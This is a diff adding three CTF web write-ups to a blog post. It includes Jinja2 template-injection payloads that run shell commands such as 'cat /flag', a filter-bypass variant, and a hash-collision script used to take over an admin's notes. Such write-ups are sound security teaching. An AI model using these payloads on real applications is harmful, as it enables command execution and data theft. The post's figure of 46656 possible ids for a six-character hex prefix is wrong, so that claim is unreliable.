@@ -3,7 +3,7 @@
  <head> 
   <meta charset="UTF-8"> 
   <link rel="stylesheet" href="/css/page.css"> 
-  <title>BSides Brisbane 2023 - Writeups (Part 2: web, pwn) - stackotter</title> 
+  <title>BSides Brisbane 2023 - Writeups (Part 2: web) - stackotter</title> 
   <meta name="viewport" content="width=device-width"> 
   <meta name="description" content="The BSides Brisbane CTF was an exciting mix of traditional jeopardy challenges, and hardware/enterprise hacking. Huge props to the team who made this top quality CTF happen!"> 
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-7ZNG4PJZEX"></script>
@@ -40,15 +40,18 @@
    </header> 
    <main class="main"> 
     <div class="markdown-body"> 
-     <h1 id="bsides-brisbane-2023---writeups-part-2:-web-pwn">BSides Brisbane 2023 - Writeups (Part 2: web, pwn)</h1> 
+     <h1 id="bsides-brisbane-2023---writeups-part-2:-web">BSides Brisbane 2023 - Writeups (Part 2: web)</h1> 
      <p>The BSides Brisbane CTF was an exciting mix of traditional jeopardy challenges, and hardware/enterprise hacking. Huge props to the team who made this top quality CTF happen!</p> 
-     <p>In part 1 I covered all crypto and rev challenges along with an interesting IoT challenge. In this part I’ll cover some of the web challenges and both of the pwn challenges.</p> 
+     <p>In part 1 I covered all crypto and rev challenges along with an interesting IoT challenge. In this part I’ll cover some of the web challenges, and in the next I’ll cover both of the pwn challenges (this post started getting a bit too long).</p> 
      <h2 id="overview">Overview</h2> 
      <p><p class="-table-of-contents">
        <ul>
         <li><a href="#xss-green-web---200-points">XSS Green (web - 200 points)</a></li>
         <li><a href="#xss-blue-web---250-points">XSS Blue (web - 250 points)</a></li>
         <li><a href="#xss-orange-web---350-points">XSS Orange (web - 350 points)</a></li>
+        <li><a href="#ninja1-web---200-points">ninja1 (web - 200 points)</a></li>
+        <li><a href="#ninja2-web---250-points">ninja2 (web - 250 points)</a></li>
+        <li><a href="#coincidence-web---250-points">Coincidence (web - 250 points)</a></li>
        </ul></p></p> 
      <hr> 
      <h2 id="xss-green-web---200-points">XSS Green (web - 200 points)</h2> 
@@ -208,6 +211,134 @@ var y = () =&gt; {
      <p>Flag: <code>flag{ed8a00ce2b82a9028a5d06ebbefb26582c0c98fc}</code></p> 
      <h3 id="conclusion">Conclusion</h3> 
      <p>This challenge was pretty interesting to solve and was a nice follow on challenge from the previous two XSS challenges that I had solved. However, the fact that the web category had two of these lucrative ‘challenge series’s meant that the pwn challenges didn’t have much value in terms of points. I spent an hour-ish total to solve the three of the XSS challenges for 800 points, but spent multiple hours on <code>protec</code> (a pwn challenge that didn’t get a second solve right until the end) for just 350 points. The CTF devs did a great job with the CTF, but I think the scoring could do with some tuning next year.</p> 
+     <hr> 
+     <h2 id="ninja1-web---200-points">ninja1 (web - 200 points)</h2> 
+     <blockquote> 
+      <p>I made a super secure website!</p> 
+      <p>Author: deluqs</p> 
+     </blockquote> 
+     <p>We’re presented with a website which allows us to; sign up, log in, change our details, view our details, and see a dev page which shows how many people have signed up. I looked around for a little while trying to create accounts and change their usernames to contain HTML, SSTI payloads and SQLi payloads, but I couldn’t see any signs that any of them had done anything. That’s when I realised that the very janky looking dev page contained our username in a message along the lines of; <code>hi username, there are 4 people registered</code>. Given that the page was simply just text without any styles whatsoever, I was pretty suspicious that it might be vulnerable to <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti">SSTI</a>. I was suspicious because often SSTI will occur when a dev tries to hack together a page quickly and can’t be bothered creating a new template file so they just give Flask the template as a string (forgetting that it shouldn’t contain user input).</p> 
+     <p>I once again set my username to the classic <code>{{7*7}}</code> SSTI payload (no clue why it’s a classic), and it worked! On the dev page my username was displayed as <code>49</code>. I changed my username a few more times to run <code>ls</code> and <code>ls /</code> followed by <code>cat /flag</code>, and found the flag pretty quickly.</p> 
+     <pre><code class="language-python">{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}
+</code></pre> 
+     <p>Figure 14: <em>the payloads I used to locate and read the flag.</em></p> 
+     <p>Flag: <code>flag{th4t-w4s-@-whoopssti}</code></p> 
+     <h3 id="conclusion">Conclusion</h3> 
+     <p>This was a nice introductory SSTI with a few more elements to figure out than usual, making it that much more fun! Very well made challenge with an element of realism.</p> 
+     <hr> 
+     <h2 id="ninja2-web---250-points">ninja2 (web - 250 points)</h2> 
+     <blockquote> 
+      <p>Ok I’ve learnt from my mistakes, hackers won’t be able to get in this time. [Period].</p> 
+      <p>Author: deluqs</p> 
+     </blockquote> 
+     <p>The attack vector is essentially the same as in ninja1, except this time there are some pesky filters in place! Please note that adding filters is not a safe fix for SSTI in the real world, it’s just a bandaid. The filters block <code>.</code>, <code>[</code>, and <code>]</code>, and later on I found that they may have been interfering with my ability to access members of the <code>self.__init__.__globals__.__builtins__</code> object via <code>attr</code> (although that could just be me misunderstanding Jinja’s <code>attr</code> filter).</p> 
+     <pre><code class="language-python">{{ getattr(getattr(getattr(getattr(getattr(getattr(self, "__init__"), "__globals__"), "__builtins__"), "__import__")('os'), "popen")('ls'), "read")() }}
+{{ ((((((((self|attr("__init__"))|attr("__globals__"))|attr("__builtins__"))|attr("__import__"))('os'))|attr("popen"))("ls"))|attr("read"))() }}
+</code></pre> 
+     <p>Figure 15: <em>two possible variants of my ninja1 payloads which avoid the blocked characters.</em></p> 
+     <p>First I tried just modifying my ninja1 payload to use two different ways of replacing the member accesses (Figure 15). I knew about the first method already, but it didn’t work because <code>getattr</code> is only available in Python and not Jinja. I found out about the second method (using the <code>attr</code> filter) by reading through <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/#builtin-filters">Jinja’s list of builtin filters</a>. The second method also didn’t work (it showed up empty in the dev page) so I tried slowly removing layers of member accesses until I got something that worked. I found that I could get accessing <code>self.__init__.__globals__.__builtins__</code> to work, but if I tried to access any of its members I got back nothing. At this point I spun up a script to allow me to test Jinja payloads locally. This was super valuable because I could get a lot of important information from the error messages.</p> 
+     <pre><code class="language-python">from flask import Flask, render_template_string
+
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    template = """
+    your_payload_goes_here
+    """
+    return render_template_string(template)
+
+app.run("0.0.0.0", port=8091)
+</code></pre> 
+     <p>Figure 16: <em>a crude setup for testing Jinja payloads.</em></p> 
+     <p>To use the test script simply modify the value of the <code>template</code> variable, run the script, and visit <code>http://localhost:8091/</code>. You’ll need to re-run the script every time that you edit the template since Flask won’t auto re-run on file change (but if I remember correctly you may able to achieve such behaviour by using the <code>flask</code> cli to run the script).</p> 
+     <p>While trying to find alternative ways to access members of the <code>__builtins__</code> object I realised that I could possibly use Jinja’s for loop block to iterate over the key-value pairs of <code>__builtins__</code> and use an <code>if</code> block to single out the value that I was interested in. It worked! I’m not entirely sure why I ended up going with using <code>eval</code> to run the <code>os.popen</code> phase of the payload, but it was likely just the result of trying out a bunch of options until one worked.</p> 
+     <pre><code class="language-python">{% for k, val in (((self|attr("__init__"))|attr("__globals__"))|attr("items"))() %}
+  {% if k == "__builtins__" %}
+    {% for k2, val2 in (val|attr("items"))() %}
+      {% if k2 == "eval" %}
+        {{val2("getattr(getattr(__import__('os'), 'popen')('cat /flag'), 'read')()")}}&lt;br /&gt;
+      {% endif %}
+    {% endfor %}
+  {% endif %}
+{% endfor %}
+</code></pre> 
+     <p>Figure 17: <em>the final payload (with line breaks and indentation added for readability).</em></p> 
+     <p>I forgot to write down the flag and can’t find it back 🤦‍♂️, but I promise it worked!</p> 
+     <p>On a high level, my approach was basically just tweak the original payload incrementally until it worked and didn’t include any banned characters 😅 I know, very useful advice.</p> 
+     <h3 id="conclusion">Conclusion</h3> 
+     <p>I had to get quite creative with my solution, well made challenge!</p> 
+     <hr> 
+     <h2 id="coincidence-web---250-points">Coincidence (web - 250 points)</h2> 
+     <blockquote> 
+      <p>Do you have thoughts you’d like to jot down? Well do I have the app for you!</p> 
+      <p>Author: deluqs</p> 
+     </blockquote> 
+     <p>We’re presented with a simple note storage website with the ability to sign up and log in. Importantly, we also get all of the code for the website which is essential for solving this challenge.</p> 
+     <p>Attempting to sign up with <code>stackotter@stackotter.dev</code> gives us an error which notifies us that only BSides BNE users are allowed to sign up. Looking at the code for <code>/signup</code> reveals that this is the result of a check that emails must end with <code>@bsidesbne.com</code>. Simple enough to satisfy.</p> 
+     <p>After signing up with a random <code>@bsidesbne.com</code> email address I poked around and found that I could create notes, view notes, and list all of my created notes. These challenges usually have the contained in the admin’s notes, so I kept that in mind as I looked through the code. My first thought was to try signing up with <code>admin@bsidesbne.com</code>. It was taken, which I assumed meant that that was the admin’s email (although a random player could’ve technically signed up with it). <code>models.py</code> had a <code>generate_uid</code> function which used <code>md5</code> (which should set off alarm bells in any hacker’s head). Let’s take a closer look at <code>models.py</code>.</p> 
+     <pre><code class="language-python">from flask_login import UserMixin
+from hashlib import md5
+from werkzeug.security import generate_password_hash
+from . import db
+
+class User(UserMixin, db.Model):
+    __tablename__ = 'users'
+    email = db.Column(db.String(100), primary_key=True, unique=True)
+    id = db.Column(db.String(64))
+    password = db.Column(db.String(100))
+    name = db.Column(db.String(1000))
+    notes = db.relationship('Note', backref='owner', lazy=True)
+
+    def generate_uid(self, email: str):
+        return md5(email.encode('utf-8')).hexdigest()[:6]
+    
+    def get_id(self):
+        return self.email
+
+    def __init__(self, email, password, name):
+        self.email = email
+        self.password = generate_password_hash(password, method='sha256')
+        self.id = self.generate_uid(email)
+        self.name = name
+
+class Note(db.Model):
+    __tablename__ = 'notes'
+    id = db.Column(db.Integer, primary_key=True)
+    uid = db.Column(db.String(8), db.ForeignKey('users.id'), nullable=False)
+    content = db.Column(db.String(2000))
+</code></pre> 
+     <p>Figure 18: <em>the contents of <code>models.py</code>.</em></p> 
+     <p>The database uses <code>generate_uid</code> to generate the <code>id</code> field of each new user, and also uses this <code>id</code> field to link notes to users. If we can find a way to get the same <code>uid</code> as the admin, we’ll be able to see their notes!</p> 
+     <p>The <code>generate_uid</code> function’s weakness isn’t actually that it uses <code>md5</code>, it’s that it only uses the first 6 characters of the hash (making collisions extremely likely). But even if it used the whole hash, hashes aren’t a very good way of generating database ids. There’s a reason that almost every database uses serial auto-incrementing primary keys.</p> 
+     <p>Forcing a collision to happen is pretty easy because the generated <code>uid</code> is just the first 6 characters of the md5 hash of our email (which we control). This function can only generate 46656 unique ids, which makes finding a collision not only easy, but super fast (it takes less than a second).</p> 
+     <p>Assuming that <code>admin@bsidesbne.com</code> was the email address of the account that we needed to find a collision for, I wrote a quick and dirty Python script (excuse the nesting).</p> 
+     <pre><code class="language-python">from hashlib import md5
+
+admin_email = "admin@bsidesbne.com"
+hash = md5(admin_email.encode('utf-8')).hexdigest()[:6]
+
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+for a in chars:
+    for b in chars:
+        for c in chars:
+            for d in chars:
+                for e in chars:
+                    for f in chars:
+                        for g in chars:
+                            for h in chars:
+                                email = a + b + c + d + e + f + g + h + "@bsidesbne.com"
+                                if md5(email.encode('utf-8')).hexdigest()[:6] == hash:
+                                    print(email)
+                                    exit(0)
+</code></pre> 
+     <p>Figure 19: <em>the collision finding script.</em></p> 
+     <p>The script essentially just generates a bunch of random <code>@bsidesbne.com</code> email addresses and compares the generated <code>uid</code>s with the generated <code>uid</code> for <code>admin@bsidesbne.com</code>. The colliding email that I found was <code>aaackp06@bsidesbne.com</code>. Signing up with this email presented me with a single note containing the flag.</p> 
+     <p>Flag: <code>flag{h4ndm4d3-1dEntif13rs-ar3-b4d}</code> (yes they are)</p> 
+     <h3 id="conclusion">Conclusion</h3> 
+     <p>Super fun code-review style challenge! We did have to guess that the admin’s email was <code>admin@bsidesbne.com</code>, but in my opinion that made the challenge more realistic without making it too guessy, which I always appreciate (it was a pretty obvious guess).</p> 
     </div> 
    </main> 
   </div>   
